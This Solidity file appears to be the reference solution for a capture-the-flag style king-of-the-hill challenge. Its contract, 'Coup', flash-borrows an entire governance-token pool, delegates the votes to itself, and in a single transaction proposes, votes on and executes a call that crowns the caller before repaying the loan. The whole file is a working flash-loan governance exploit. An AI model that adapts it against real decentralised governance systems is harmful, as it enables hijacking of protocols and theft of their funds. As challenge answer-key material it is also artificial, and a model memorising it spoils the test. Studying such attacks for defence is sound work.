// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference takeover contract (self-contained: only the interfaces a player observes from the
// provided sources). Deploy with the four addresses from GET /koth/info, then call
// pwn(<your koth token as bytes>). One transaction: flash-borrow the whole gov-token pool,
// delegate to self so live voting power clears quorum, propose + vote + execute
// crown(you, tag), repay. epochNonce() is read live, so re-running each round re-seizes.
interface ILender {
    function maxFlashLoan() external view returns (uint256);
    function flashLoan(uint256 amount, address receiver, bytes calldata data) external;
}

interface IToken {
    function delegate(address) external;
    function transfer(address, uint256) external returns (bool);
}

interface IGov {
    function epochNonce() external view returns (uint256);
    function propose(address target, bytes calldata data, uint256 epoch) external returns (uint256);
    function castVote(uint256 id) external;
    function execute(uint256 id) external;
}

contract Coup {
    ILender public lender;
    IToken public token;
    IGov public gov;
    address public throne;
    bytes public tag;

    constructor(address _lender, address _token, address _gov, address _throne) {
        lender = ILender(_lender);
        token = IToken(_token);
        gov = IGov(_gov);
        throne = _throne;
    }

    function pwn(bytes calldata _tag) external {
        tag = _tag;
        lender.flashLoan(lender.maxFlashLoan(), address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        token.delegate(address(this));
        bytes memory data = abi.encodeWithSignature("crown(address,bytes)", tx.origin, tag);
        uint256 id = gov.propose(throne, data, gov.epochNonce());
        gov.castVote(id);
        gov.execute(id);
        token.transfer(address(lender), amount);
    }
}
